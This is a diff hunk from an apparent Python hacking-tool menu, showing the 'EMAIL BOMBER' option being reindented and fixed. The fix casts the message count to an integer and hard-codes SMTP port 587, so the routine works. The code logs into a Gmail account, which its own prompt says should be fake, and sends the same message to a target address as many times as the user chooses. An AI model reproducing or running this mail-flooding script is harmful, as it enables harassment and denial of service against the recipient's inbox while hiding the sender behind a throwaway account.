@@ -280,24 +280,23 @@ while ans:
             time.sleep(5)
     elif ans=="9":
 ######################################--EMAIL BOMBER--#################################################
-            print("Use a fake gmail acc to bomb and u must have support for 'less secure apps' set to 'turn on' on your Gmail. Here is the link to do so: https://www.google.com/settings/security/lesssecureapps")
-            email_provider = 'smtp.gmail.com'
-            email_address = input("Enter Your Gmail(Gmail ur using to bomb -->: ")
-            password = input("Enter Your Gmail Password(Gmail Password ur using to bomb -->: ")
-            msg = input("Enter your txt message -->: ")
-            text_amount = input("Enter your amount of txt messages -->: ")
-            target_email = input("Enter Target email -->: ")
-            wait = int(input("Enter Delay Between each message -->: "))
-            ### DO NOT EDIT BELOW THIS LINE ###
-            server = smtplib.SMTP(email_provider, email_port)
-            server.starttls()
-            server.login(email_address, password)
-            for _ in range(0,text_amount):
-                server.sendmail(email_address,target_email,msg)
-                print("sent")
-                time.sleep(wait)
-            print("{} texts were sent. Hope you had a good time ;)".format(text_amount))
-            server.quit()
+        print("Use a fake gmail acc to bomb and u must have support for 'less secure apps' set to 'turn on' on your Gmail. Here is the link to do so: https://www.google.com/settings/security/lesssecureapps")
+        email_provider = 'smtp.gmail.com'
+        email_address = input("Enter Your Gmail(Gmail ur using to bomb -->: ")
+        password = input("Enter Your Gmail Password(Gmail Password ur using to bomb -->: ")
+        msg = input("Enter your txt message -->: ")
+        text_amount = int(input("Enter your amount of txt messages -->: "))
+        target_email = input("Enter Target email -->: ")
+        wait = int(input("Enter Delay Between each message -->: "))
+        server = smtplib.SMTP(email_provider, 587)
+        server.starttls()
+        server.login(email_address, password)
+        for _ in range(0,text_amount):
+            server.sendmail(email_address,target_email,msg)
+            print("sent")
+            time.sleep(wait)
+        print("{} texts were sent. :)".format(text_amount))
+        server.quit()
     elif ans=="10":
 ######################################--EXIT--#################################################
         exit()
